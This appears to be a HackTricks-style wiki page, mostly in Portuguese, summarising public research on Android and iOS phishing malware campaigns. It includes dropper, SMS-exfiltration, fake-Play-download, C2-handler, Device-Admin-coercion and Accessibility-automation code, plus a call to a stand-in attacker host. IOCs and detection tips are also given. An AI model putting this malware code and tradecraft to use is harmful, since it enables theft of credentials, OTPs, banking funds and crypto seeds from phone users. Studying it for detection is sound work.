# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página aborda técnicas usadas por threat actors para distribuir **malicious Android APKs** e **iOS mobile-configuration profiles** através de phishing (SEO, social engineering, lojas falsas, dating apps, etc.).
> O material é adaptado da campanha SarangTrap exposta pela Zimperium zLabs (2025) e de outras pesquisas públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrar dezenas de domínios parecidos (dating, cloud share, car service…).
– Usar palavras-chave no idioma local e emojis no elemento `<title>` para ranquear no Google.
– Hospedar *ambas* as instruções de instalação Android (`.apk`) e iOS na mesma landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* No primeiro arranque o app pede um **invitation / verification code** (ilusão de acesso exclusivo).
* O código é **POSTed over HTTP** para o Command-and-Control (C2).
* C2 replies `{"success":true}` ➜ o malware continua.
* Sandboxes / AVs em análise dinâmica que nunca submetem um código válido não observam **comportamento malicioso** (evasão).
4. **Runtime Permission Abuse** (Android)
* Permissões perigosas são solicitadas apenas **após resposta positiva do C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recentes **removem `<uses-permission>` para SMS do `AndroidManifest.xml`** mas deixam o caminho de código Java/Kotlin que lê SMS via reflection ⇒ reduz a pontuação estática enquanto ainda funciona em dispositivos que concedem a permissão via abuso de `AppOps` ou alvos antigos.
5. **Facade UI & Background Collection**
* O app mostra views inofensivas (SMS viewer, gallery picker) implementadas localmente.
* Enquanto isso exfiltra:
- IMEI / IMSI, número de telefone
- Dump completo do `ContactsContract` (JSON array)
- JPEG/PNG de `/sdcard/DCIM` comprimidos com [Luban](https://github.com/Curzibn/Luban) para reduzir o tamanho
- Conteúdo SMS opcional (`content://sms`)
Os payloads são **batch-zipped** e enviados via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Um único **mobile-configuration profile** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em supervisão tipo “MDM”.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
7. **Network Layer**
* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Durante a avaliação do malware, automatize a fase do invitation code com Frida/Objection para alcançar o ramo malicioso.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` com o runtime `PackageManager#getRequestedPermissions()`; ausência de perms perigosas é um sinal de alerta.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar rajadas de POST inconsistentes após a inserção do código.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` no macOS para listar `PayloadContent` e identificar entitlements excessivos.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: bypass automático do código de convite</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Esse padrão foi observado em campanhas que abusam de temas de benefícios governamentais para roubar credenciais UPI indianas e OTPs. Operadores encadeiam plataformas reputadas para entrega e resiliência.

### Cadeia de entrega através de plataformas confiáveis
- Isca em vídeo no YouTube → a descrição contém um link curto
- Link curto → site de phishing no GitHub Pages imitando o portal legítimo
- O mesmo repo do GitHub hospeda um APK com um selo falso “Google Play” que aponta diretamente para o arquivo
- Páginas de phishing dinâmicas hospedadas no Replit; canal remoto de comandos usa Firebase Cloud Messaging (FCM)

### Dropper com payload embutido e instalação offline
- O primeiro APK é um instalador (dropper) que entrega o malware real em `assets/app.apk` e solicita ao usuário que desative Wi‑Fi/dados móveis para atenuar a detecção em nuvem.
- O payload embutido instala-se sob um rótulo inocente (por exemplo, “Secure Update”). Após a instalação, tanto o instalador quanto o payload estão presentes como apps separados.

Dica de triagem estática (grep por payloads embutidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware busca uma lista em texto simples, separada por vírgulas, de live endpoints a partir de um shortlink; transformações simples de string produzem o caminho final da phishing page.

Exemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- A etapa “Make payment of ₹1 / UPI‑Lite” carrega um formulário HTML do atacante a partir do endpoint dinâmico dentro de um WebView e captura campos sensíveis (telefone, banco, UPI PIN) que são `POST`ed para `addup.php`.

Carregador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Permissões agressivas são solicitadas na primeira execução:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Os contatos são percorridos para enviar em massa SMS de smishing a partir do dispositivo da vítima.
- SMS recebidos são interceptados por um broadcast receiver e enviados com metadados (remetente, corpo, slot do SIM, ID aleatório por dispositivo) para `/addsm.php`.

Esboço do receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- A payload se registra no FCM; mensagens push trazem um campo `_type` usado como um switch para acionar ações (por exemplo, atualizar modelos de texto de phishing, alternar comportamentos).

Exemplo de payload do FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esboço do Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicadores/IOCs
- APK contém payload secundário em `assets/app.apk`
- WebView carrega pagamento de `gate.htm` e exfiltra para `/addup.php`
- Exfiltração de SMS para `/addsm.php`
- Busca de configuração via shortlink (ex.: `rebrand.ly/*`) retornando endpoints CSV
- Apps rotulados como genéricos “Update/Secure Update”
- Mensagens FCM `data` com um discriminador `_type` em apps não confiáveis

---

## APK Smuggling baseado em Socket.IO/WebSocket + Páginas falsas do Google Play

Atacantes substituem cada vez mais links estáticos de APK por um canal Socket.IO/WebSocket embutido em iscas que imitam o Google Play. Isso oculta a URL do payload, contorna filtros de URL/extensão e preserva uma experiência de instalação (UX) realista.

Fluxo típico do cliente observado em ataques reais:

<details>
<summary>Downloader falso do Play via Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por que isso evade controles simples:
- Nenhum URL estático de APK é exposto; o payload é reconstruído na memória a partir de frames WebSocket.
- Filtros de URL/MIME/extensão que bloqueiam respostas .apk diretas podem deixar passar dados binários tunelados via WebSockets/Socket.IO.
- Crawlers e URL sandboxes que não executam WebSockets não recuperarão o payload.

Veja também WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay e abuso de Device Admin, automação de ATS e orquestração de NFC relay – estudo de caso RatOn

A campanha RatOn banker/RAT (ThreatFabric) é um exemplo concreto de como operações modernas de phishing móvel combinam WebView droppers, automação de UI guiada por Accessibility, overlays/ransom, coerção via Device Admin, Automated Transfer System (ATS), tomada de controle de carteiras crypto e até orquestração de NFC-relay. Esta seção abstrai as técnicas reutilizáveis.

### Stage-1: WebView → ponte de instalação nativa (dropper)
Os atacantes exibem um WebView apontando para uma página maliciosa e injetam uma interface JavaScript que expõe um instalador nativo. Um toque em um botão HTML chama o código nativo que instala um APK de segunda fase empacotado nos assets do dropper e, em seguida, o executa diretamente.

Padrão mínimo:

<details>
<summary>Padrão mínimo do dropper Stage-1 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML na página:
```html
<button onclick="bridge.installApk()">Install</button>
```
Após a instalação, o dropper inicia o payload via package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideia de hunting: apps não confiáveis chamando `addJavascriptInterface()` e expondo métodos do tipo installer ao WebView; APK que inclui um payload secundário embutido em `assets/` e invoca o Package Installer Session API.

### Funil de consentimento: Accessibility + Device Admin + prompts de runtime subsequentes
Stage-2 abre um WebView que hospeda uma página “Access”. Seu botão invoca um exported method que navega a vítima para as configurações de Accessibility e solicita a ativação do serviço malicioso. Uma vez concedida, o malware usa Accessibility para clicar automaticamente através dos diálogos de permissão de runtime subsequentes (contacts, overlay, manage system settings, etc.) e solicita Device Admin.

- Accessibility ajuda programaticamente a aceitar prompts posteriores encontrando botões como “Allow”/“OK” na árvore de nós e disparando cliques.
- Verificação/solicitação da permissão overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing por sobreposição / extorsão via WebView
Operadores podem emitir comandos para:
- renderizar uma sobreposição em tela cheia a partir de uma URL, ou
- passar HTML inline que é carregado em uma sobreposição WebView.

Usos prováveis: coerção (entrada do PIN), abertura de wallet para capturar PINs, mensagens de extorsão. Mantenha um comando para garantir que a permissão de sobreposição esteja concedida caso esteja faltando.

### Modelo de controle remoto – pseudo-tela de texto + screen-cast
- Baixa largura de banda: periodicamente fazer dump da Accessibility node tree, serializar textos visíveis/roles/bounds e enviar ao C2 como uma pseudo-tela (comandos como `txt_screen` uma vez e `screen_live` contínuo).
- Alta fidelidade: solicitar MediaProjection e iniciar screen-casting/gravação sob demanda (comandos como `display` / `record`).

### Playbook ATS (automação de app bancário)
Dada uma tarefa em JSON, abrir o app bancário, controlar a UI via Accessibility com uma mistura de consultas por texto e toques por coordenadas, e inserir o PIN de pagamento da vítima quando solicitado.

Exemplo de tarefa:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemplos de textos vistos em um fluxo alvo (CZ → EN):
- "Nová platba" → "Novo pagamento"
- "Zadat platbu" → "Inserir pagamento"
- "Nový příjemce" → "Novo destinatário"
- "Domácí číslo účtu" → "Número de conta doméstica"
- "Další" → "Próximo"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sim, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Concluído"

Operadores também podem verificar/aumentar limites de transferência via comandos como `check_limit` e `limit` que navegam pela interface de limites de forma semelhante.

### Extração da seed de carteiras Crypto
Alvos como MetaMask, Trust Wallet, Blockchain.com, Phantom. Fluxo: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implemente seletores sensíveis à localidade (EN/RU/CZ/SK) para estabilizar a navegação entre idiomas.

### Coerção do Device Admin
As Device Admin APIs são usadas para aumentar as oportunidades de captura do PIN e frustrar a vítima:

- Bloqueio imediato:
```java
dpm.lockNow();
```
- Expirar a credencial atual para forçar a alteração (Accessibility captura o novo PIN/senha):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forçar desbloqueio não biométrico desativando recursos biométricos do keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muitos controles do DevicePolicyManager exigem Device Owner/Profile Owner em versões recentes do Android; alguns builds de OEM podem ser mais permissivos. Sempre valide no OS/OEM alvo.

### Orquestração de relay NFC (NFSkate)
Stage-3 pode instalar e iniciar um módulo externo de NFC-relay (por ex., NFSkate) e até fornecer um template HTML para guiar a vítima durante o relay. Isso possibilita cash-out contactless com card-present, juntamente com ATS online.

Referência: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Conjunto de comandos do operador (exemplo)
- UI/estado: `txt_screen`, `screen_live`, `display`, `record`
- Redes sociais: `send_push`, `Facebook`, `WhatsApp`
- Sobreposições: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Carteiras: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Anti-detecção ATS orientado por Accessibility: cadência de texto similar à humana e injeção dual de texto (Herodotus)

Atores de ameaça cada vez mais misturam automação orientada por Accessibility com anti-detecção afinada contra biometria comportamental básica. Um banker/RAT recente mostra dois modos complementares de entrega de texto e um toggle do operador para simular digitação humana com cadência randomizada.

- Modo de descoberta: enumerar nodes visíveis com selectors e bounds para direcionar precisamente inputs (ID, text, contentDescription, hint, bounds) antes de agir.
- Injeção dual de texto:
- Modo 1 – `ACTION_SET_TEXT` diretamente no node alvo (estável, sem teclado);
- Modo 2 – clipboard set + `ACTION_PASTE` no node com foco (funciona quando setText direto está bloqueado).
- Cadência similar à humana: dividir a string fornecida pelo operador e entregá-la caractere a caractere com delays randomizados de 300–3000 ms entre eventos para evadir heurísticas de “digitação em velocidade de máquina”. Implementado ou por crescimento progressivo do valor via `ACTION_SET_TEXT`, ou colando um caractere por vez.

<details>
<summary>Esboço Java: descoberta de nodes + entrada por caractere com atraso via setText ou clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays de bloqueio para encobrir fraudes:
- Renderize um `TYPE_ACCESSIBILITY_OVERLAY` em tela cheia com opacidade controlada pelo operador; mantenha-o opaco para a vítima enquanto a automação remota prossegue por baixo.
- Comandos normalmente expostos: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay mínimo com alpha ajustável:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivas de controle do operador frequentemente observadas: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (compartilhamento de tela).

## Referências

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
